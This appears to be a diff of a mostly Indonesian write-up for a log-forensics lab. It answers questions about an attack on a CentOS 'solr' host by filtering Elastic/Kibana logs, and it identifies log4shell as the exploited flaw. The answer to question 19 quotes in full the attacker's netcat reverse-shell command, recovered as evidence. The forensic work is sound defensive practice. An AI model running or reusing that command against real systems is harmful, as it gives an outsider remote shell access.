@@ -141,12 +141,16 @@ Kami Kembali menelurusi lebih detail menggunakan analyze event menu. Disini kami
 ![image](https://user-images.githubusercontent.com/43168046/183103751-cddbc854-3a40-4093-bb35-793de99e7a72.png)
 
 ## 19.	If you focus on nc process, you can get the entire command that the attacker ran to get a reverse shell. Write the full command?
-seperti sebelumnya, kami mendapati suatu command yang dijalankan pada procees nc tersebut yaitu nc -e /bin/bash 192.168.1.10 9999
+disini kami mencoba mencari informasi berdasarakan traffic. kami pun masuk analytics dan discover. lalu berdasarkan pertanyaan sebelumnya kami menggunakan filter "host.name : "CentOS" and user.name : solr". kami pun menemukan 3 traffic data yang sesuai dengan filter kami. akhirnya kami menemukan command yang dimaksud. yaitu "	
+nc -e /bin/bash 192.168.1.10 9999"
 
-![image](https://user-images.githubusercontent.com/43168046/183103868-bc55fea9-a382-4855-90d6-448b6c310bec.png)
+![image](https://user-images.githubusercontent.com/43168046/183109658-0e03088a-f745-41e7-b018-655bec004a07.png)
 
 ## 20.	From the previous three questions, you may remember a famous java vulnerability. What is it?
 Berdasarkan informasi terbaru, java vulenerability yang terkenal tersebut adalah apache log4j library yaitu log4shell 
+
+## 21 . What is the entire log file path of the "solr" application?
+
 
 
 
